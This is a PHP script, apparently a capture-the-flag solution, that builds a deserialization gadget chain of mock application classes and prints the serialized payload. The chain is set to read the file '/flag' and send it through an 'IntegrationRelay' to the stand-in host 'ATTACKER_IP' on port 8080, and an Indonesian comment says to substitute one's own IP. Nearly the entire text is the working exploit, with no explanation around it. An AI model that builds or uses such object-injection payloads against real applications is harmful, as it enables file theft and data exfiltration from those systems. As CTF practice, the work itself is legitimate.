<?php
// Simulasi class (sebenarnya sudah ada di aplikasi)
class IntegrationRelay {
    public $scheme = 'http';
    public $host = 'ATTACKER_IP'; // Ganti dengan IP Anda
    public $port = 8080;
    public $path = '/';
}

class DeliveryTarget {
    public $relay;
    public $field = 'data';
    public $expectedChannel = 'summary';
    public function __construct($relay) { $this->relay = $relay; }
}

class LocalAssetStore {
    public $root = '/';
    public $prefix = '';
}

class AssetCatalog {
    public $stores = [];
}

class SnapshotView {
    public $catalog;
    public $path = '/flag';
    public function __construct($catalog) { $this->catalog = $catalog; }
}

class SnippetLayout {
    public $view;
    public $wrapper = '{{body}}';
}

class PreviewEnvelope {
    public $layout;
    public $meta = ['path' => '/flag', 'slot' => 'summary'];
}

class DeliveryJournal {
    public $target;
    public $armed = true;
    public $channel = 'summary';
    public function __construct($target) { $this->target = $target; }
}

class PreviewBatch {
    public $items = [];
    public $journal;
    public $state = 'sealed';
}

// Build chain
$relay = new IntegrationRelay();
$target = new DeliveryTarget($relay);
$store = new LocalAssetStore();
$catalog = new AssetCatalog();
$catalog->stores = [$store];
$view = new SnapshotView($catalog);
$layout = new SnippetLayout();
$layout->view = $view;
$envelope = new PreviewEnvelope();
$envelope->layout = $layout;
$journal = new DeliveryJournal($target);
$batch = new PreviewBatch();
$batch->items = [$envelope];
$batch->journal = $journal;

echo serialize($batch);
?>
